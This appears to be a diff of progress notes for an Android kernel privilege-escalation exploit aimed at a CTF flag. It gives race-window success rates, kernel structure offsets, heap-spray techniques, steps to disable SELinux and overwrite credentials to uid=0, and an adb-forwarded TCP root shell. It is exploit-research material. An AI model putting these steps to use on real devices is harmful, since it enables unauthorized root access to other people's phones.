+**Operational notes (this session).**
+- adb "no devices/emulators found" transients recur; fix = kill adb
+  processes + `start-server` (`fix-adb.ps1`).  Never mid-batch.
+- Bash wrapper scripts calling adb fail under background jobs; launch
+  each batch as a direct async `adb shell` job instead.
+- Batch cadence that worked: foreground-blocking runs with explicit
+  enforce/uptime checks between batches; pull `/data/log/prev_dump.log`
+  FIRST after every reset (rotates each boot).
+
+**Fire economics (all of today's data).**  Residue fire ≈ 1/10–1/6 per
+window; a fire completes (zeroed-or-ours lock page) ≈ 1/3, else
+panic/hang (foreign page).  Root needs 2 completing fires per boot
+with `NOVALIDATE` (selinux + cred) or 3 with validation.  The 250 ms
+window removes the dead-frame panic class; foreign-page panics remain
+the boot-killer.
+
+**Next (ordered).**
+1. Grind selinux batches (6 attempts) until `enforce=0`.
+2. Same boot: `run-credself.sh` batches.  First success validates the
+   perf winner (pid match); afterwards use `DIRECT_CRED_SELF_NOVALIDATE=1`
+   to spend all windows on the write.
+3. On `cred-self ROOT`: verify `/data/local/tmp/cred-self-root.txt`,
+   `adb forward tcp:5559 tcp:5559` for the root shell, then read the
+   CTF flag.
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+**Next shot**
+1. Confirm adb + uptime ≥ 4 min.
+2. If slide unknown, `sh /data/local/tmp/run-slide.sh`.
+3. `DIRECT_HOLD_MM=1 DIRECT_BOOTID_CHILD=1 DIRECT_BOOTID_BOOTID=1`
+   `SLIDE_P0_OFFSET=<slide>` `EXPLOIT_ATTEMPTS=6`.
+4. Need `hold-owner got=1` with `hi` a kernel ptr, then parent, then
+   `hold-cred done uid=0`.
+5. Backup if hold-mm fire rate stays ~0: plant Q=`init_task+0x828`
+   (proven) first, or walk `init_pid_ns.idr.xa_head`.
+
+**Do not**
+- Smash `init_task+0x548` / `__entry_task`.
+- Reuse a P0 `DIRECT_BOOTID_ADDR` across reboots.
+- Assume dead-child `mm->owner` is live.
 
 ## Files Modified
 
@@ -2172,7 +2769,12 @@ All S9280 session changes through 2026-08-17 01:20 are in this commit
 | `src/util.c` | KernelSnitch bruteforce stride `MM_STRUCT_SZ` -> `MM_STRUCT_SLAB_SZ` (fix #9); `EXPLOIT_CORE`/`exploit_core()`; cleanup before sends; knob plumbing; `SKB_SNDBUF` env override; `P0_ORACLE_PARENT_PIPEBUF` reclaim-vs-walk diagnostic knob; fix #19 reclaim ordering (neighbours freed before drain pressure; supersedes reverted fix #18); fix #21 `LATE_NEIGHBOUR_FREE` (drains first, `close(memfd_leak)` last so the empty target slab is discarded to the buddy allocator); fix #22 `COMPACT_PAYLOAD` (4 KB walk image + anon-fault reclaim, shelved); fix #23 `SKB_RECLAIM_SOCKS` (up to 8 socketpairs multiplying the queued frag volume); fix #26 `DGRAM_RECLAIM` (content-controlled dgram data kmalloc spray); fix #28 `SLABINFO_DIAG` (three-point slab census); fix #29 `RECLAIM_WAVES` (periodic reclaim bursts across the arming window); fix #30 `RECLAIM_WAVE_ANON` (per-wave 2 MB anon image faults + 4 MB wave SO_SNDBUF) |
 | `src/pipe.c` | `objs_per_slab` uses `MM_STRUCT_SLAB_SZ`; pipe page child lifecycle aligned with `prepare_kernel_page` (fix #10); gate diagnostic continues past tee/read failures with `tee_failures` counter (fix #13); fix #31 gate tenant identification dump (non-zero byte count + qwords at +0x40/+0x980/+0x9C0/+0xA20 on marker miss) |
 | `src/main.c` | `exploit_core()` call sites; consumer diagnostic logging |
-| `src/slide_app.c` | `P0_ORACLE_GATE_DIAG` gate-verify on trigger failure; `cmp_requeue_pi` logging; `SLIDE_CONSUMER_BURST`/`SLIDE_CONSUMER_SPACING_USEC`; `SLIDE_ENTER_DELAY_USEC`/`PSELECT_DELAY_USEC` delay forcing; pselect copy-back dump on fires (fix #14); `SLIDE_OWNER_UNLOCK` owner-unlock trigger (fix #16) |
+| `src/slide_app.c` | `P0_ORACLE_GATE_DIAG` gate-verify on trigger failure; `cmp_requeue_pi` logging; `SLIDE_CONSUMER_BURST`/`SLIDE_CONSUMER_SPACING_USEC`; `SLIDE_ENTER_DELAY_USEC`/`PSELECT_DELAY_USEC` delay forcing; pselect copy-back dump on fires (fix #14); `SLIDE_OWNER_UNLOCK` owner-unlock trigger (fix #16); `SLIDE_ENTER_DELAY_PIN`; `app_cred_self_route()` + `DIRECT_CRED_SELF[_NOVALIDATE]` + TCP root shell (2026-08-17 PM) |
+
+2026-08-17 PM additions (this session): `src/util.c` `perf_find_task_self()`
++ decl in `src/common.h`; `src/slide_app.c` `app_cred_self_route()` and the
+route hook in `app_trigger_fops_slide_route`; `TASK_PID_OFF=0x630` in
+`src/targets/e3q-S9280ZCS6DZF2/target.h`.
 
 ## Build & Test
 
